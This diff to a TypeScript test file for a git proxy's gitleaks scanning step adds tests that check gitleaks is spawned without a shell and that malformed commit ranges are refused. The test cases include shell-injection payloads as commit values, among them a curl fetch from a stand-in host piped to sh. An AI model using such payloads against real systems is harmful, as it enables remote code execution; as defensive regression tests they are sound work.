@@ -50,6 +50,10 @@ vi.mock('node:child_process', async (importOriginal) => {
   };
 });
 
+const COMMIT_FROM = 'a'.repeat(40);
+const COMMIT_TO = 'b'.repeat(40);
+const ROOT_COMMIT = 'c'.repeat(40);
+
 describe('gitleaks', () => {
   describe('exec', () => {
     let exec: typeof import('../../src/proxy/processors/push-action/gitleaks').exec;
@@ -79,8 +83,8 @@ describe('gitleaks', () => {
       action = new Action('1234567890', 'push', 'POST', 1234567890, 'test/repo.git');
       action.proxyGitPath = '/tmp';
       action.repoName = 'test-repo';
-      action.commitFrom = 'abc123';
-      action.commitTo = 'def456';
+      action.commitFrom = COMMIT_FROM;
+      action.commitTo = COMMIT_TO;
 
       stepSpy = vi.spyOn(Step.prototype, 'setError');
     });
@@ -120,7 +124,7 @@ describe('gitleaks', () => {
 
       const gitRootCommitMock = {
         exitCode: 0,
-        stdout: 'rootcommit123\n',
+        stdout: `${ROOT_COMMIT}\n`,
         stderr: '',
       };
 
@@ -162,7 +166,7 @@ describe('gitleaks', () => {
 
       const gitRootCommitMock = {
         exitCode: 0,
-        stdout: 'rootcommit123\n',
+        stdout: `${ROOT_COMMIT}\n`,
         stderr: '',
       };
 
@@ -203,7 +207,7 @@ describe('gitleaks', () => {
 
       const gitRootCommitMock = {
         exitCode: 0,
-        stdout: 'rootcommit123\n',
+        stdout: `${ROOT_COMMIT}\n`,
         stderr: '',
       };
 
@@ -294,7 +298,7 @@ describe('gitleaks', () => {
 
       const gitRootCommitMock = {
         exitCode: 0,
-        stdout: 'rootcommit123\n',
+        stdout: `${ROOT_COMMIT}\n`,
         stderr: '',
       };
 
@@ -350,5 +354,49 @@ describe('gitleaks', () => {
         'gitleaks - Failed to get gitleaks config: Unable to read file at the provided config path: /invalid/path.toml',
       );
     });
+    it('should spawn gitleaks without a shell and pass --log-opts as a single argument', async () => {
+      vi.mocked(getAPIs).mockReturnValue({ gitleaks: { enabled: true } });
+
+      const mockProcess = (exitCode: number, stdout: string) => ({
+        on: (event: string, cb: (exitCode: number) => void) => {
+          if (event === 'close') cb(exitCode);
+        },
+        stdout: { on: (_: string, cb: (stdout: string) => void) => cb(stdout) },
+        stderr: { on: (_: string, cb: (stderr: string) => void) => cb('') },
+      });
+      vi.mocked(spawn)
+        .mockReturnValueOnce(mockProcess(0, `${ROOT_COMMIT}\n`))
+        .mockReturnValueOnce(mockProcess(0, ''));
+
+      const result = await exec(req, action);
+
+      expect(result.steps[0].error).toBe(false);
+      for (const call of vi.mocked(spawn).mock.calls) {
+        expect(call[2]).not.toHaveProperty('shell');
+      }
+      const [command, args] = vi.mocked(spawn).mock.calls[1];
+      expect(command).toBe('gitleaks');
+      expect(args).toContain(`--log-opts=--first-parent ${COMMIT_FROM}^..${COMMIT_TO}`);
+    });
+
+    it.each([
+      ['commitTo', "abc'$(touch${IFS}/tmp/pwned)'"],
+      ['commitTo', ":/.*|x'$(curl${IFS}evil/x|sh)'x"],
+      ['commitFrom', "abc'$(id)'"],
+      ['commitTo', undefined],
+    ] as const)(
+      'should refuse to run gitleaks when %s is not a commit hash (%s)',
+      async (field, value) => {
+        vi.mocked(getAPIs).mockReturnValue({ gitleaks: { enabled: true } });
+        action[field] = value;
+
+        const result = await exec(req, action);
+
+        expect(vi.mocked(spawn)).not.toHaveBeenCalled();
+        expect(result.steps).toHaveLength(1);
+        expect(result.steps[0].error).toBe(true);
+        expect(result.steps[0].errorMessage).toContain('Invalid commit range');
+      },
+    );
   });
 });
